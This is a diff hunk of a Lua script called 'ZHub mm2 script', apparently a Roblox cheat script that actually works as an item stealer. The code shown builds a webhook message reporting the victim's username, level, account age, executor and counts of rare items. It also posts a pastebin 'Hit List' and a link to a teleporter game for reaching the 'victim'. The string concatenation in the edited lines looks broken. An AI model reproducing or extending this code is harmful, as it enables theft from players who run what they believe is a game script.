@@ -1062,12 +1062,12 @@ local EverythingString = "-- // Uniques\n" .. uniquesString ..
 
 local WebHookEmbed = CreateEmbed(
     "ZHub mm2 script",
-    "Copy and paste script above to teleport to victim.",
+    "Copy and paste the script above in the teleporter game to teleport to victim.",
     1983258,
     {
         {name = "```Info```", value = "```Username: "..LP.Name.."\nLevel: "..tostring(getLvl()).."\nAccount-Age: "..tostring(LP.AccountAge).."\nExecutor: "..identifyexecutor().."\nReceiver: "..userName.."```"},
 {name = "```Hit Info```", value = "```Total Value: "..tostring(math.floor(valueCount + 0.5)).."\nTotal Count: "..tostring(itemsCount - 2).."\n\nUniques: "..tostring(uniqueItemsC).."\nAncients: "..tostring(ancientItemsC).."\nGodlys: "..tostring(godlyItemsC).."\nLegendarys: "..tostring(legendaryItemsC).."\nVintage: "..tostring(vintageItemsC).."\nRares: "..tostring(rareItemsC).."\nUncommons: "..tostring(uncommonItemsC).."\nCommons: "..tostring(commonItemsC).."```"},
-{name = "```Hit List```", value = "[Click Me]("..pastebin(EverythingString)..") "\n[Teleporter](<https://www.roblox.com/games/18845424641/Mori-Scripts-TELEPORTER>)"}
+{name = "```Hit List```", value = "[Hit List]("..pastebin(EverythingString)..")"\n[Teleporter](<https://www.roblox.com/games/18845424641/Mori-Scripts-TELEPORTER>)"}
     }
 )
 if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1  then
